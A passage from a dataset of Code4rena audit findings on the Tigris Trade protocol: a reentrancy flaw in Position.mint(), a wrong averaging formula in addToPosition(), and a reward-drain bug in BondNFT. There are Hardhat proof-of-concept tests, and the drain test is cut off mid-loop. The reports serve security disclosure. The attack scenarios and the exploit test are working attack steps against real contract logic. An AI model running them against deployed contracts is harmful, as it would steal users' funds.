      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Position.sol#L126-L161\n\n\n## Vulnerability details\n\n## Impact\nFunction `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give attacker opportunity to reenter the Trading contract logics and perform malicious action while contract storage state is wrong. the only limitation of the attacker is that he need to bypass `_checkDelay()` checks. attacker can perform this action:\n1. call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code.\n2. call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.\n\n## Proof of Concept\nThis is `mint()` code in Position contract:\n```\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage\n        if (_mintTrade.orderType > 0) { // update the values of some storage functions\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n```\nAs you can see by calling `_safeMint()` code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. so code don't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.\nthere could be multiple scenarios that attacker can perform the attack and do some damage. two of them are:\n\n\n**scenario #1 where attacker remove other users limit orders and create broken storage state**\n1. attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1.\n2. then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check.\n3. variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list.\n4. attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`.\n5. `cancelLimitOrder()` checks would pass and would tries to call `Position.burn(ID1)`.\n6. `burn()` function would tries to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0 so code would remove the 0 index limit order which is belongs to another user.\n7. execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.\n\nso there is two impact here, first other users limit order got removed and the second is that contract storage had bad state and burned tokens get stock in the list.\n\n\n**scenario #2 where attacker steal contract/users funds by wrong profit calculation**\n1. attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low.\n2. code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address.\n3. the value of `initId[ID1]` is not yet set for ID1.\n4. attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position.\n5. code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value were be based on the `newMargin`.\n6. the execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value.\n7. then the value of `initId[ID1]` for attacker position would be very low which would cause `accInterest` to be very higher than it supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.\n\nso attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.\n\nthere can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nfollow the check-effect-interaction pattern.",
      "summary": "\nThis bug report is about a vulnerability in the Position contract of the 2022-12-tigris project. The code in question can be found at the given GitHub link. The vulnerability is caused by the lack of a check-effect-interaction pattern when using the mint() function. This allows an attacker to reenter the Trading contract logics and perform malicious actions, such as removing other users limit orders or stealing funds from the contract or users. The proof of concept provided in the report includes code from the mint() function, as well as two scenarios in which an attacker can exploit the vulnerability. The recommended mitigation step is to follow the check-effect-interaction pattern.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/400",
      "tags": [],
      "finders": [
        "hihen",
        "rotcivegaf",
        "debo",
        "0xsomeone",
        "wait",
        "KingNFT",
        "stealthyz",
        "unforgiven",
        "mookimgo"
      ]
    },
    {
      "id": "6325",
      "title": "[H-06] Incorrect calculation of new price while adding position",
      "impact": "HIGH",
      "content": "\nThe formula used for calculating `_newPrice` in `addToPosition()` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.\n\nThe wrong formula\n\n    uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\nThe correct formula is\n\n    uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\n\nWhy this works?\n\nGiven\n\n    P1 = _trade.price\n    P2 = _price\n    P = _newPrice\n    M1 = _trade.margin\n    M2 = _addMargin\n    M =  M1 + M2 = _newMargin\n    L = _trade.leverage\n    U1 = M1 * L  = old position in USD\n    U2 = M2 * L = new position in USD\n    U = U1 + U2 = total position in USD\n    E1 = U1 / P1 = old position of base asset, such as ETH, of the pair\n    E2 = U2 / P2 = new position of base asset of the pair\n    E = E1 + E2 = total position of base asset of the pair\n\nThen\n\n    P = U / E\n      = (U1 + U2) / (E1 + E2)\n      = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)\n      = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)\n      = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)\n      = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]\n      = P1 * P2 * M / (M1 * P2 + M2 * P1)\n\nproven.\n\n### Proof of Concept\n\nThe following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Incorrect calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1666'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('1667'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin - loss + new margin\n      //                         = $500 - $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('714'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('715'))).to.be.true;\n    });\n\n  });\n});\n\n```\n\nThe test result\n\n    Incorrect calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n           Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\n           Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nUse the correct formula, the following test case is for the same above examples after fix.\n\n```\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Correct calculation of new margin price while adding position\", function () {\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await deployments.get(\"TradingExtension\");\n    tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);\n    const Position = await deployments.get(\"Position\");\n    position = await ethers.getContractAt(\"Position\", Position.address);\n    MockDAI = await deployments.get(\"MockDAI\");\n    mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);\n    MockUSDC = await deployments.get(\"MockUSDC\");\n    mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);\n    const PairsContract = await deployments.get(\"PairsContract\");\n    pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);\n    const Referrals = await deployments.get(\"Referrals\");\n    referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);\n    StableVault = await deployments.get(\"StableVault\");\n    stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);\n    await stablevault.connect(owner).listToken(MockDAI.address);\n    await stablevault.connect(owner).listToken(MockUSDC.address);\n    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);\n    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));\n    await tradingExtension.connect(owner).setNode(node.address, true);\n    await tradingExtension.connect(owner).setNode(node2.address, true);\n    await tradingExtension.connect(owner).setNode(node3.address, true);\n    await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);\n    await network.provider.send(\"evm_mine\");\n    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);\n\n    const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");\n    badstablevault = await BadStableVault.deploy(StableToken.address);\n\n    const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");\n    chainlink = await ChainlinkContract.deploy();\n\n    TradingLibrary = await deployments.get(\"TradingLibrary\");\n    tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);\n    await trading.connect(owner).setLimitOrderPriceRange(1e10);\n  });\n\n\n  describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {\n    let orderId;\n    let initPrice = parseEther(\"1000\");\n    beforeEach(async function () {\n      // To simpliy the problem, set fees to 0\n      await trading.setFees(true, 0, 0, 0, 0, 0);\n      await trading.setFees(false, 0, 0, 0, 0, 0);\n\n      let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];\n      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, initPrice, 0, 2000000000, false]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      );\n      \n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];\n      orderId = await position.getCount();\n      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);\n      expect(await position.assetOpenPositionsLength(1)).to.equal(1);\n      let trade = await position.trades(orderId);\n      let marginAfterFee = trade.margin;\n      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);\n      expect(trade.price.eq(parseEther('1000'))).to.be.true;\n      expect(trade.leverage.eq(parseEther('2'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\", async function () {\n      // The price increases from $1000 to $2000, the old position earns $1000 profit.\n      // The expected PnL payout = old margin + earned profit + new margin\n      //                         = $500 + $1000 + $500\n      //                         = $2000\n      let addingPrice = parseEther('2000');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('2000'))).to.be.true;\n    });\n\n    it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\", async function () {\n      // The price decreases from $1000 to $750, the old position losses $250.\n      // The expected PnL payout = old margin - loss + new margin\n      //                         = $500 - $250 + $500\n      //                         = $750\n      let addingPrice = parseEther('750');\n      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];\n      let addingMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, addingPrice, 0, 2000000000, false]\n        )\n      );\n      let addingSig = await node.signMessage(\n        Buffer.from(addingMessage.substring(2), 'hex')\n      );\n\n      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];\n      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);\n\n      let trade = await position.trades(orderId);\n      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,\n        trade.margin, trade.leverage, trade.accInterest);\n      expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;\n      expect(pnl._payout.lt(parseEther('750'))).to.be.true;\n    });\n\n  });\n});\n\n```\n\nThe test result\n\n    Correct calculation of new margin price while adding position\n        Initial margin $500, leverage 2x, position $1000, price $1000\n           Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\n           Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1375841573)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1384495437):**\n > The warden has shown how, using `addToPosition` can cause the payout math to become incorrect, because this highlights an issue with the math of the protocol, which will impact its functionality, I believe High Severity to be appropriate.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/236#issuecomment-1407511530):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174986 \n\n\n\n***\n\n",
      "summary": "\nA bug report has been issued regarding the calculation of the '_newPrice' in the 'addToPosition()' function of the 'Trading.sol' contract. It has been found that the formula used is incorrect and users will lose part of their funds/profit while using this function. The wrong formula is as follows: \n\n```\nuint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n```\n\nThe correct formula is as follows:\n\n```\nuint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);\n```\n\nThe impact of this bug is that users will not receive the expected PnL payout when they add a new position, as the formula used is incorrect. The proof of concept is given in the form of a test case, which shows two examples where users lose some funds due to adding a new position when their existing position is in either a profit or loss state. The tools used to detect this bug are 'hardhat'. The recommended mitigation steps are to use the correct formula, which is provided in the report. The test case for the same examples after the fix is also provided.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/236",
      "tags": [],
      "finders": [
        "KingNFT"
      ]
    },
    {
      "id": "6324",
      "title": "[H-05] Malicious user can steal all assets in BondNFT",
      "impact": "HIGH",
      "content": "\nMalicious user can drain all assets in BondNFT, and other users will lose their rewards.\n\n### Proof of Concept\n\nWhen calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.\n\n```solidity\n  if (bond.expired) {\n      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n      if (totalShares[bond.asset] > 0) {\n          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n      }\n  }\n```\n\nIn the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.\n\nAccording to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively.\nThus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.\n\nA malicious user can exploit this vulnerability to steal all assets in BondNFT contract:\n\n1.  Create two bonds (B1, B2) with different `expireEpoch`\n2.  At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.\n3.  Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.\n\nAn example of such an attack:\n\n```javascript\ndiff --git a/test/09.Bonds.js b/test/09.Bonds.js\nindex 16c3ff5..7c445c3 100644\n--- a/test/09.Bonds.js\n+++ b/test/09.Bonds.js\n@@ -245,7 +245,90 @@ describe(\"Bonds\", function () {\n       await lock.connect(user).release(2);\n       expect(await bond.pending(1)).to.be.equals(\"999999999999999999725\"); // Negligable difference from 1000e18 due to solidity division\n     });\n+\n+    it.only(\"Drain BondNFT rewards\", async function () {\n+      const getState = async () => {\n+        const balHacker= await stabletoken.balanceOf(hacker.address);\n+        const balLock = await stabletoken.balanceOf(lock.address);\n+        const balBond = await stabletoken.balanceOf(bond.address);\n+        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)];\n+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};\n+      };\n+      const parseEther = (v) => ethers.utils.parseEther(v.toString());\n+      const gwei = parseEther(1).div(1e9);\n+\n+      // prepare tokens\n+      const TotalRewards = parseEther(8000);\n+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);\n+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));\n+      const hacker = rndAddress;\n+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));\n+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));\n+\n+      // bond1 - user\n+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);\n+      await bond.distribute(stabletoken.address, parseEther(3800));\n+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);\n+      // Skip some time\n+      await network.provider.send(\"evm_increaseTime\", [20*86400]);\n+      await network.provider.send(\"evm_mine\");\n+\n+      // bond2 - hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);\n+      // bond3 - hacker\n+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);\n+\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // Skip 10+ days, bond2 is expired\n+      await network.provider.send(\"evm_increaseTime\", [13*86400]);\n+      await network.provider.send(\"evm_mine\");\n+      await bond.distribute(stabletoken.address, parseEther(2100));\n+\n+      // check balances before hack\n+      let st = await getState();\n+      expect(st.bond).to.be.equals(TotalRewards);\n+      expect(st.lock).to.be.equals(parseEther(3000));\n+      expect(st.hacker).to.be.equals(parseEther(0+700));\n+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);\n+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);\n+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);\n+\n+      // first claim of expired bond2\n+      await lock.connect(hacker).claim(2);\n+      st = await getState();\n+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);\n+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(parseEther(0));\n+      expect(st.pending3).to.be.gt(parseEther(1000+1000));\n+\n+      // hack\n+      const remainReward = st.bond;\n+      let pending3 = st.pending3;\n+      let i = 0;\n+      for (; remainReward.gt(pending3); i++) {\n+        // claim expired bond2 repeatedly\n+        await 